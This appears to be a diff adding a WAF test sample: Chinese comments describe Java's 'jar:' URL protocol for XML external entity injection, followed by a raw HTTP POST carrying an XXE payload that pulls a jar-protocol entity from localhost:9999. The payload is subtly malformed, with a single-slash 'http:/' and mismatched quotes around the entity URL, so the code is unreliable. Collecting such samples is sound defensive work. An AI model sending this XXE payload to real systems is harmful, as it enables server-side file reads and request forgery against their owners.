@@ -1,0 +1,18 @@
+# XML外部实体注入_Java特性jar协议
+# "jar" 协议是一种用于访问Java归档文件（.jar文件）内部资源的URL协议。Java归档文件是一种用于打包Java类文件、相关资源和元数据的归档文件格式。这种文件格式可以简化Java应用程序和库的分发和部署。
+# 当使用"jar" 协议时，URL的格式通常如下：
+# jar:<url>!/<entry>
+# 其中，<url> 是指向.jar文件的URL，<entry> 是.jar文件中的特定条目（例如，文件或目录）。
+POST /?bid=hd_tag_m8mv24nq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24nq
+RM-PRO-Token: 5bb67dee51f467a3a87e04e5cd0d271a
+RM-PRO-Time: 1742808395934
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE convert [ 
+  <!ENTITY remote SYSTEM "jar:http:/localhost:9999/jarzip!/test.php'> 
+]>
+<convert>&remote;</convert>
